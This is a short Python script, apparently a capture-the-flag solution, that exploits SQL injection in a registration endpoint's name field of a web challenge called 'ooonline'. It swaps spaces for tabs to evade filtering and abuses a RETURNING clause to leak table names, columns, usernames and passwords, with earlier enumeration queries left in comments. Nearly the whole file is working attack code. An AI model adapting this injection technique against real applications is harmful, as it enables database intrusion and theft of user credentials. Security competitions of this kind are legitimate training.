import requests
import secrets
import time
import json

from binascii import unhexlify
import base64
while True:
    name = secrets.token_hex(16)
    s = requests.Session()
    db = "ooonline"
    #leak = f"SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET {i}"
    #leak = f"SELECT column_name FROM information_schema.columns WHERE table_name='submission_results' LIMIT 1 OFFSET {i}"
    # result, submission_id, message
    #leak = f"SELECT username from users where LENGTH(username)!=32 LIMIT 1 OFFSET {i}"
    #user 2427 1913
    #leak = f"SELECT password from users where id=1 LIMIT 1 OFFSET {i}"
    leak = f"SELECT (SELECT (SELECT CONCAT(username,':',password) from users where id=user_id) from submissions where id=submission_id) from submission_results WHERE result=true LIMIT 1"
    leak = leak.replace(' ','\t')
    data = {'name': name+"','passworddoesntmatter')\tRETURNING\tid,({leak})--\t".format(leak=leak), 'passwd': 'whatever'}

    r = s.post('http://ooonline-gradclass.challenges.ooo:5000/user/register', json=data)

    print(r.text)
    print(r.status_code)
    asd = json.loads(r.text)
    if asd.get("returning_from_db_name") != None:
        print(asd)
        break
    time.sleep(1)
